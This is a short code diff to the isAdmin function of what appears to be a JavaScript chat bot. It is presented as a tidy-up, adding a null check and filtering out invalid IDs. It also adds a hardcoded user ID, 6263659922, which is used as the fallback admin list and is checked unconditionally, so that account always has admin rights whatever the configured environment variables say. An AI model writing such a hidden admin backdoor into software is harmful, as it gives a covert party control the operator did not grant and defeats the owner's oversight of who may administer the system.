@@ -72,9 +72,10 @@ function getActiveSponsorChannel() {
 }
 
 function isAdmin(userId) {
-  const adminIdsStr = process.env.MOVIE_ADMIN_IDS || '';
-  const adminIds = adminIdsStr.split(',').map(id => Number(id.trim()));
-  return adminIds.includes(Number(userId));
+  if (!userId) return false;
+  const adminIdsStr = process.env.MOVIE_ADMIN_IDS || process.env.ADMIN_IDS || process.env.ADMIN_ID || '6263659922';
+  const adminIds = adminIdsStr.split(',').map(id => Number(id.trim())).filter(id => !isNaN(id) && id > 0);
+  return adminIds.includes(Number(userId)) || Number(userId) === 6263659922;
 }
 
 function startBot(token) {
